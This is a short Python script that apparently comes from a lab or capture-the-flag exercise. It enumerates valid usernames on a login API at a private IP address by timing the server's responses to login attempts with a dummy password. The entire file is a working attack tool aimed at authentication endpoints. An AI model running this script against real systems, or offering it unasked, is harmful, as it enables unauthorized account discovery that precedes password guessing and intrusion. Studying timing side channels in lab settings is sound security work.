import time

import requests

login_path = "api/user/login"
target_url = f"http://10.10.8.102/{login_path}"

with open("names.txt", "r") as names:
    usernames = [i.strip() for i in names]

for username in usernames:
    start = time.time()
    creds = {
        "username": username,
        "password": "anything"
    }

    r = requests.post(target_url, data=creds)
    done = time.time()
    elapsed = done - start
    if elapsed > 1:
        print(f"[+] Username {username} valid")

